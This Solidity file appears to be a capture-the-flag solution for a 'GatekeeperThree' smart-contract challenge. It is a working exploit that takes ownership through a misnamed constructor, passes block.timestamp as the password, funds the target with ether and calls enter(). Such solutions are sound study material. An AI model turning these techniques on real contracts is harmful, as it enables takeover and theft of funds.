// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IGatekeeperThree {
    function entrant() external view returns (address);
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract GatekeeperThree {
    IGatekeeperThree gatekeeperThreeInstance;

    constructor(address _instanceAddress) payable {
        gatekeeperThreeInstance = IGatekeeperThree(_instanceAddress);
    }

    function attack() external {
        gatekeeperThreeInstance.construct0r();
        gatekeeperThreeInstance.createTrick();
        gatekeeperThreeInstance.getAllowance(block.timestamp);
        (bool success,) = address(gatekeeperThreeInstance).call{value: 0.002 ether}("");
        require(success, "Failed to send ether to Gatekeeper Three");
        gatekeeperThreeInstance.enter();
        require(gatekeeperThreeInstance.entrant() == msg.sender, "Attack failed");
    }
}
